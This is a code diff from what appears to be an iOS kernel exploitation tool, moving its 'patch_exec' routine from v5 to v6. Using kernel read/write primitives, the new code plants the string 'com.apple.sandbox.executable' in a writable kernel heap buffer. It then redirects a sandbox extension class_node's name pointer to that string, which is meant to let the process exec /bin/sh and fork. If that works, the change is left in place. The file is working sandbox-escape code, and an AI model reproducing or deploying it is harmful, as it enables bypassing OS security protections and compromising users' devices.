@@ -163,6 +163,25 @@ static bool kaddr_ok(uint64_t addr) {
     return true;
 }
 
+// Check if an address is in the kernelcache static region (SPTM read-only).
+// Constant strings, vtables, and compiled code live here — writes will panic.
+// The kernelcache base is around 0xfffffff03xxxxxxx after KASLR.
+static bool is_kernel_static(uint64_t addr) {
+    // Kernelcache sits in the 0xfffffff0... range (upper kernel VA space).
+    // Zone heap sits in 0xffffffdc..0xffffffe2 range (lower kernel VA space).
+    // Anything above 0xffffffec00000000 and with the 0xfffffff0 prefix
+    // is almost certainly in the static kernelcache image.
+    return (addr >= 0xffffffec00000000ULL && addr <= 0xfffffff7ffffffffULL);
+}
+
+// Stricter check for write targets: must be a valid kernel address,
+// NOT in zone metadata, and NOT in the kernelcache static region.
+static bool kaddr_writable(uint64_t addr) {
+    if (!kaddr_ok(addr)) return false;
+    if (is_kernel_static(addr)) return false;
+    return true;
+}
+
 // Stricter check for struct pointers: must be 8-byte aligned
 static bool kptr_ok(uint64_t addr) {
     if (!kaddr_ok(addr)) return false;
@@ -2673,11 +2692,13 @@ char *kresearch_dump_extensions(void) {
 char *kresearch_patch_exec(void) {
     buf_init();
     bc_init();
-    buf_append("=== PATCH EXEC v5: ANALYSIS + WRITE (zone-meta protected) ===\n\n");
-    buf_append("v3 panicked: wrote into live extension data_ptr buffers.\n");
-    buf_append("v4 was read-only. v5 restores write: overwrites class_name\n");
-    buf_append("string (NOT the data buffer) with zone metadata validation.\n\n");
-    bc("patch_exec v5 starting\n");
+    buf_append("=== PATCH EXEC v6: POINTER REDIRECT ===\n\n");
+    buf_append("v5 panicked: class_name strings are in kernelcache static\n");
+    buf_append("region (SPTM read-only). Cannot overwrite constant strings.\n");
+    buf_append("v6: writes target string to an extension DATA BUFFER (zone heap,\n");
+    buf_append("writable), then redirects the class_name POINTER in the class_node\n");
+    buf_append("struct (also zone heap) to point to our string.\n\n");
+    bc("patch_exec v6 starting\n");
 
     uint64_t self_proc = proc_self();
     if (!self_proc) {
@@ -2718,33 +2739,34 @@ char *kresearch_patch_exec(void) {
     uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
     kreadbuf(ext_set_kptr, buckets, sizeof(buckets));
 
-    // ── Phase 1: Scan all 16 buckets, find candidate for rename ──
-    buf_append("\n--- Extension Bucket Analysis ---\n");
+    // ── Phase 1: Scan all 16 buckets ──
+    buf_append("\n--- Extension Bucket Scan ---\n");
     bc("scanning %d buckets\n", SANDBOX_EXT_NUM_BUCKETS);
 
     int rw_count = 0;
     int total_classes = 0;
     int total_exts = 0;
 
-    // Track best candidate for write: we want a read-write class_node
-    // whose class_name pointer is valid and the string is long enough
-    // to overwrite with "com.apple.sandbox.executable" (29 chars + NUL = 30 bytes).
-    uint64_t candidate_cn_addr   = 0;    // class_node kernel address
-    uint64_t candidate_name_addr = 0;    // class_name string kernel address
-    int      candidate_bucket    = -1;
-    char     candidate_orig[64]  = {0};  // original string for restore
+    // We need two things:
+    // 1. A class_node in a writable region (zone heap) to redirect its pointer
+    // 2. A writable data buffer to plant our target string into
+    uint64_t candidate_cn_addr      = 0;  // class_node address (to modify its +0x10 pointer)
+    uint64_t candidate_cn_name_ptr  = 0;  // original class_name pointer (for restore)
+    int      candidate_bucket       = -1;
+    uint64_t stash_addr             = 0;  // writable data buffer to plant our string
+    uint64_t stash_data_len         = 0;
+    char     stash_orig[64]         = {0}; // original bytes at stash location
 
     const char *target_name = "com.apple.sandbox.executable";
-    size_t target_len = strlen(target_name) + 1; // 30 bytes including NUL
+    size_t target_len = strlen(target_name) + 1; // 30 bytes
 
     for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
         if (!buckets[i]) {
             buf_append("  bucket[%d]: NULL\n", i);
             continue;
         }
-
         if (!kptr_ok(buckets[i])) {
-            buf_append("  bucket[%d]: 0x%llx ⚠️ SKIP (zone_meta=%s)\n",
+            buf_append("  bucket[%d]: 0x%llx SKIP (zone_meta=%s)\n",
                        i, buckets[i], is_zone_meta(buckets[i]) ? "YES" : "no");
             continue;
         }
@@ -2761,27 +2783,28 @@ char *kresearch_patch_exec(void) {
             kreadbuf(cn_classname, name, 255);
         }
 
-        buf_append("  bucket[%d]: class=\"%s\" cn=0x%llx count=%llu\n",
-                   i, name, buckets[i], (unsigned long long)cn_count);
+        bool cn_writable = kaddr_writable(buckets[i]);
+        bool name_static = is_kernel_static(cn_classname);
+        buf_append("  bucket[%d]: \"%s\" cn=0x%llx%s name=0x%llx%s count=%llu\n",
+                   i, name, buckets[i],
+                   cn_writable ? " [heap]" : " [RO!]",
+                   cn_classname,
+                   name_static ? " [static]" : " [heap]",
+                   (unsigned long long)cn_count);
         total_classes++;
 
-        // Track candidate: find a read-write class whose name string is
-        // long enough to hold "com.apple.sandbox.executable\0" (30 bytes).
-        // "com.apple.app-sandbox.read-write" is 32 chars → 33 bytes → fits.
         if (strstr(name, "read-write")) {
             rw_count++;
-            size_t orig_len = strlen(name) + 1;
-            if (kaddr_ok(cn_classname) && orig_len >= target_len && !candidate_cn_addr) {
-                candidate_cn_addr   = buckets[i];
-                candidate_name_addr = cn_classname;
-                candidate_bucket    = i;
-                memcpy(candidate_orig, name, sizeof(candidate_orig) - 1);
-                buf_append("    ★ CANDIDATE for rename (orig %zu bytes ≥ target %zu)\n",
-                           orig_len, target_len);
+            // Pick first writable class_node as our target
+            if (cn_writable && !candidate_cn_addr) {
+                candidate_cn_addr     = buckets[i];
+                candidate_cn_name_ptr = cn_classname;
+                candidate_bucket      = i;
+                buf_append("    -> CANDIDATE class_node (writable heap)\n");
             }
         }
 
-        // Count extensions in this bucket
+        // Walk extensions to find a writable data buffer for our string stash
         uint64_t ext = cn_ext;
         int ext_count = 0;
         while (ext && kptr_ok(ext) && ext_count < 20) {
@@ -2790,28 +2813,36 @@ char *kresearch_patch_exec(void) {
 
             uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
             uint64_t data_len = *(uint64_t *)(eraw + EXT_OFF_DATALEN);
-            char path[128] = {0};
-            if (kaddr_ok(data_ptr)) {
-                kreadbuf(data_ptr, path, sizeof(path) - 1);
+
+            // We want a data buffer big enough for our string AND that's writable
+            if (!stash_addr && data_ptr && kaddr_writable(data_ptr) && data_len >= target_len + 64) {
+                // Stash our string at the END of the buffer (past the path),
+                // aligned to 8 bytes, to minimize corruption risk
+                uint64_t stash_off = (data_len - target_len) & ~7ULL;
+                if (stash_off >= 64) { // leave at least 64 bytes for the real path
+                    stash_addr = data_ptr + stash_off;
+                    stash_data_len = data_len;
+                    // Save original bytes for restore
+                    kreadbuf(stash_addr, stash_orig, sizeof(stash_orig) - 1);
+                    buf_append("    ext[%d]: STASH at 0x%llx (buf 0x%llx len %llu, off %llu)\n",
+                               ext_count, stash_addr, data_ptr,
+                               (unsigned long long)data_len, (unsigned long long)stash_off);
+                }
             }
-            buf_append("    ext[%d]: data=0x%llx len=%llu path=\"%.60s\"\n",
-                       ext_count, data_ptr, (unsigned long long)data_len, path);
 
             uint64_t next = *(uint64_t *)(eraw + 0x00);
-            if (next && !kptr_ok(next)) {
-                buf_append("    ⚠️ STOPPED: ext next 0x%llx (zone_meta=%s)\n",
-                           next, is_zone_meta(next) ? "YES" : "no");
-                break;
-            }
+            if (next && !kptr_ok(next)) break;
             ext = next;
             ext_count++;
             total_exts++;
         }
     }
 
-    buf_append("\nSummary: %d classes, %d extensions, %d read-write nodes\n",
+    buf_append("\nSummary: %d classes, %d exts, %d rw nodes\n",
                total_classes, total_exts, rw_count);
-    bc("found %d classes, %d exts, %d rw\n", total_classes, total_exts, rw_count);
+    buf_append("Candidate CN: 0x%llx (bucket %d)\n", candidate_cn_addr, candidate_bucket);
+    buf_append("Stash buffer: 0x%llx\n", stash_addr);
+    bc("cn=0x%llx stash=0x%llx\n", candidate_cn_addr, stash_addr);
 
     // ── Phase 2: Check BEFORE sandbox state ──
     buf_append("\n--- Sandbox Checks (BEFORE) ---\n");
@@ -2825,48 +2856,63 @@ char *kresearch_patch_exec(void) {
                exec_sh_before == 0 ? "ALLOWED" : "DENIED");
     buf_append("process-fork:          %d (%s)\n", fork_before,
                fork_before == 0 ? "ALLOWED" : "DENIED");
-
     bc("BEFORE: exec=%d fork=%d\n", exec_sh_before, fork_before);
 
-    // ── Phase 3: WRITE — rename class_name string ──
-    if (!candidate_cn_addr || !candidate_name_addr) {
-        buf_append("\n--- WRITE SKIPPED ---\n");
-        buf_append("No suitable candidate found for class_name rename.\n");
-        buf_append("Need a read-write class_node with name string ≥ %zu bytes.\n", target_len);
-        bc("no candidate, skipping write\n");
+    // ── Phase 3: WRITE — plant string + redirect pointer ──
+    if (!candidate_cn_addr) {
+        buf_append("\n--- WRITE SKIPPED: no writable class_node found ---\n");
+        bc("no writable cn, skip\n");
+    } else if (!stash_addr) {
+        buf_append("\n--- WRITE SKIPPED: no writable data buffer for string stash ---\n");
+        bc("no stash buffer, skip\n");
     } else {
-        buf_append("\n--- WRITE: Renaming class_name string ---\n");
-        buf_append("Target: bucket[%d] cn=0x%llx name_str=0x%llx\n",
-                   candidate_bucket, candidate_cn_addr, candidate_name_addr);
-        buf_append("Original: \"%s\"\n", candidate_orig);
-        buf_append("New:      \"%s\"\n", target_name);
-        bc("WRITE: renaming name_str @ 0x%llx\n", candidate_name_addr);
-        bc("orig=\"%s\" -> \"%s\"\n", candidate_orig, target_name);
+        buf_append("\n--- WRITE Phase ---\n");
 
-        // Validate the name string address is writable (not PPL/zone-meta)
-        if (!kaddr_ok(candidate_name_addr)) {
-            buf_append("⚠️ ABORT: name string addr 0x%llx fails kaddr_ok!\n",
-                       candidate_name_addr);
-            bc("ABORT: name_addr fails kaddr_ok\n");
+        // Step 1: Plant target string in the data buffer stash
+        buf_append("Step 1: Writing \"%s\" to stash @ 0x%llx\n", target_name, stash_addr);
+        bc("planting string @ 0x%llx\n", stash_addr);
+        kwritebuf(stash_addr, (void *)target_name, (uint32_t)target_len);
+
+        // Verify the string was planted
+        char plant_verify[64] = {0};
+        kreadbuf(stash_addr, plant_verify, sizeof(plant_verify) - 1);
+        bool plant_ok = (strcmp(plant_verify, target_name) == 0);
+        buf_append("  Verify: \"%s\" %s\n", plant_verify, plant_ok ? "OK" : "FAILED");
+        bc("plant verify: %s\n", plant_ok ? "OK" : "FAIL");
+
+        if (!plant_ok) {
+            buf_append("ABORT: string plant failed — data buffer may be PPL protected\n");
+            bc("ABORT: plant failed\n");
         } else {
-            // Write the new class name string in-place
-            // This overwrites only the string bytes, NOT the class_node struct
-            // and NOT the extension data buffers (which is what v3 did wrong).
-            bc("writing %zu bytes to 0x%llx\n", target_len, candidate_name_addr);
-            kwritebuf(candidate_name_addr, (void *)target_name, (uint32_t)target_len);
+            // Step 2: Redirect class_name pointer from static → our stash
+            uint64_t cn_name_field = candidate_cn_addr + CN_OFF_CLASSNAME;
+            buf_append("Step 2: Redirecting class_name ptr @ 0x%llx\n", cn_name_field);
+            buf_append("  Old ptr: 0x%llx (kernel static)\n", candidate_cn_name_ptr);
+            buf_append("  New ptr: 0x%llx (zone heap stash)\n", stash_addr);
+            bc("redirect 0x%llx: 0x%llx -> 0x%llx\n",
+               cn_name_field, candidate_cn_name_ptr, stash_addr);
 
-            // Verify the write
-            char verify[64] = {0};
-            kreadbuf(candidate_name_addr, verify, sizeof(verify) - 1);
-            buf_append("Verify readback: \"%s\"\n", verify);
-            bc("readback: \"%s\"\n", verify);
+            kwrite64(cn_name_field, stash_addr);
 
-            bool write_ok = (strcmp(verify, target_name) == 0);
-            buf_append("Write %s\n", write_ok ? "✅ SUCCEEDED" : "❌ FAILED (PPL/SPTM blocked?)");
+            // Verify the pointer was redirected
+            uint64_t ptr_verify = kread64(cn_name_field);
+            bool ptr_ok = (ptr_verify == stash_addr);
+            buf_append("  Verify ptr: 0x%llx %s\n", ptr_verify, ptr_ok ? "OK" : "FAILED");
 
-            if (write_ok) {
+            // Read through the new pointer to make sure it resolves
+            char resolve[64] = {0};
+            if (kaddr_ok(ptr_verify)) {
+                kreadbuf(ptr_verify, resolve, sizeof(resolve) - 1);
+            }
+            buf_append("  Resolves to: \"%s\"\n", resolve);
+            bc("ptr verify: %s resolves=\"%s\"\n", ptr_ok ? "OK" : "FAIL", resolve);
+
+            if (!ptr_ok) {
+                buf_append("ABORT: pointer redirect failed — class_node may be PPL protected\n");
+                bc("ABORT: ptr redirect failed\n");
+            } else {
                 // ── Phase 4: Check AFTER sandbox state ──
-                buf_append("\n--- Sandbox Checks (AFTER rename) ---\n");
+                buf_append("\n--- Sandbox Checks (AFTER pointer redirect) ---\n");
                 int exec_sh_after = sandbox_check(pid, "process-exec",
                                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
                 int exec_df_after = sandbox_check(pid, "process-exec",
@@ -2879,32 +2925,36 @@ char *kresearch_patch_exec(void) {
                            exec_df_after == 0 ? "ALLOWED" : "DENIED");
                 buf_append("process-fork:          %d (%s)\n", fork_after,
                            fork_after == 0 ? "ALLOWED" : "DENIED");
-
                 bc("AFTER: exec_sh=%d exec_df=%d fork=%d\n",
                    exec_sh_after, exec_df_after, fork_after);
 
                 bool changed = (exec_sh_after != exec_sh_before) || (fork_after != fork_before);
                 if (changed) {
-                    buf_append("\n🎉 SANDBOX STATE CHANGED! Leaving rename in place.\n");
-                    bc("SANDBOX CHANGED! keeping rename\n");
+                    buf_append("\n*** SANDBOX STATE CHANGED! Leaving redirect in place. ***\n");
+                    bc("SANDBOX CHANGED! keeping\n");
                 } else {
-                    buf_append("\nNo sandbox change — restoring original name.\n");
-                    bc("no change, restoring original\n");
-                    kwritebuf(candidate_name_addr, candidate_orig,
-                              (uint32_t)(strlen(candidate_orig) + 1));
+                    buf_append("\nNo sandbox change.\n");
 
-                    // Verify restore
-                    char restore_verify[64] = {0};
-                    kreadbuf(candidate_name_addr, restore_verify, sizeof(restore_verify) - 1);
-                    buf_append("Restored: \"%s\" %s\n", restore_verify,
-                               strcmp(restore_verify, candidate_orig) == 0 ? "✅" : "❌");
-                    bc("restored: \"%s\"\n", restore_verify);
+                    // Restore: pointer back to original, then restore stash bytes
+                    buf_append("Restoring pointer to 0x%llx\n", candidate_cn_name_ptr);
+                    bc("restoring ptr and stash\n");
+                    kwrite64(cn_name_field, candidate_cn_name_ptr);
+
+                    // Verify pointer restored
+                    uint64_t restore_ptr = kread64(cn_name_field);
+                    buf_append("  Ptr restored: 0x%llx %s\n", restore_ptr,
+                               restore_ptr == candidate_cn_name_ptr ? "OK" : "FAILED");
+
+                    // Restore stash bytes
+                    kwritebuf(stash_addr, stash_orig, (uint32_t)target_len);
+                    buf_append("  Stash bytes restored\n");
+                    bc("restored\n");
                 }
             }
         }
     }
 
-    // ── Phase 5: Read sandbox_label flags for analysis ──
+    // ── Phase 5: sandbox_label raw dump ──
     buf_append("\n--- sandbox_label raw dump ---\n");
     uint8_t lbl_raw[0x70];
     kreadbuf(sbx, lbl_raw, sizeof(lbl_raw));
@@ -2918,8 +2968,8 @@ char *kresearch_patch_exec(void) {
         buf_append("\n");
     }
 
-    buf_append("\n=== PATCH EXEC v5 COMPLETE ===\n");
-    bc("patch_exec v5 complete\n");
+    buf_append("\n=== PATCH EXEC v6 COMPLETE ===\n");
+    bc("patch_exec v6 complete\n");
     bc_close();
     return buf_finish();
 }
